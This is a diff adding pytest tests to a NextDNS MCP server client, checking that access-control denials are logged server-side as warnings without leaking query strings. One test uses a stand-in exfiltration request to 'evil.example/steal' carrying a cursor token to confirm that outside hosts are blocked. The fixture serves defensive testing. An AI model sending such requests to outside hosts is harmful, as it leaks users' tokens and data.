@@ -711,6 +711,81 @@ class TestAccessControlledClientStreamLogging:
         assert any("GET /profiles/abc123/logs/download" in msg for msg in info_messages)
 
 
+class TestRefusalPathsVisibleServerSide:
+    """WORK-250: every ACL refusal is visible in the server log, not only in the caller's error.
+
+    Independent of the opt-in JSONL call log, a denial must leave a WARNING record
+    on the server logger that identifies the refusal (profile id or blocked host),
+    while the caller-facing typed error is preserved. Record metadata is limited to
+    the safe profile id / host plus the redacted path — never the query string
+    (AGENT.md logging rule).
+    """
+
+    @pytest.mark.asyncio
+    async def test_read_denial_warns_naming_the_profile(
+        self, mock_super_request: Any, clean_env: Callable[[str, str], None], caplog: pytest.LogCaptureFixture
+    ) -> None:
+        """A per-profile read denial is a server-visible WARNING naming the profile id."""
+        clean_env("NEXTDNS_READABLE_PROFILES", "xyz999")
+
+        with caplog.at_level(logging.INFO, logger="nextdns_mcp.client"):
+            async with AccessControlledClient(base_url="https://api.nextdns.io") as client:
+                with pytest.raises(AccessDeniedError) as exc_info:
+                    await client.request("GET", "/profiles/abc123/logs?search=secret-search-term")
+
+        mock_super_request.assert_not_called()
+        assert exc_info.value.code == "read_access_denied"
+        assert "Read access denied for profile: abc123" in str(exc_info.value)
+        warnings = [record.getMessage() for record in caplog.records if record.levelno == logging.WARNING]
+        assert any("Read access denied for profile: abc123" in msg for msg in warnings)
+        assert any("method=GET" in msg for msg in warnings)
+        for msg in warnings:
+            assert "?" not in msg, f"Query string leaked at WARNING: {msg}"
+            assert "secret-search-term" not in msg
+
+    @pytest.mark.asyncio
+    async def test_write_denial_warns_naming_the_profile(
+        self, mock_super_request: Any, clean_env: Callable[[str, str], None], caplog: pytest.LogCaptureFixture
+    ) -> None:
+        """A per-profile write denial is a server-visible WARNING naming the profile id."""
+        clean_env("NEXTDNS_READABLE_PROFILES", "ALL")
+        clean_env("NEXTDNS_READ_ONLY", "true")
+
+        with caplog.at_level(logging.INFO, logger="nextdns_mcp.client"):
+            async with AccessControlledClient(base_url="https://api.nextdns.io") as client:
+                with pytest.raises(AccessDeniedError) as exc_info:
+                    await client.request("PATCH", "/profiles/abc123/settings?dry=1", json={"name": "Test"})
+
+        mock_super_request.assert_not_called()
+        assert exc_info.value.code == "write_access_denied"
+        assert "server is in read-only mode" in str(exc_info.value)
+        warnings = [record.getMessage() for record in caplog.records if record.levelno == logging.WARNING]
+        assert any("Write operation denied: server is in read-only mode" in msg for msg in warnings)
+        for msg in warnings:
+            assert "?" not in msg, f"Query string leaked at WARNING: {msg}"
+
+    @pytest.mark.asyncio
+    async def test_blocked_destination_warns_naming_the_host(
+        self, mock_super_request: Any, clean_env: Callable[[str, str], None], caplog: pytest.LogCaptureFixture
+    ) -> None:
+        """A blocked non-NextDNS destination is a server-visible WARNING naming the host only."""
+        clean_env("NEXTDNS_READABLE_PROFILES", "ALL")
+
+        with caplog.at_level(logging.INFO, logger="nextdns_mcp.client"):
+            async with AccessControlledClient(base_url="https://api.nextdns.io") as client:
+                with pytest.raises(AccessDeniedError) as exc_info:
+                    await client.request("GET", "https://evil.example/steal?cursor=secret-cursor-token")
+
+        mock_super_request.assert_not_called()
+        assert exc_info.value.code == "access_denied"
+        warnings = [record.getMessage() for record in caplog.records if record.levelno == logging.WARNING]
+        assert any("Blocked request to non-NextDNS host: evil.example" in msg for msg in warnings)
+        for msg in warnings:
+            assert "?" not in msg, f"Query string leaked at WARNING: {msg}"
+            assert "secret-cursor-token" not in msg
+            assert "steal" not in msg, f"Full URL path leaked at WARNING: {msg}"
+
+
 class TestLibraryLoggerRedaction:
     """The library loggers must not print request URLs at INFO (issue #263)."""
 
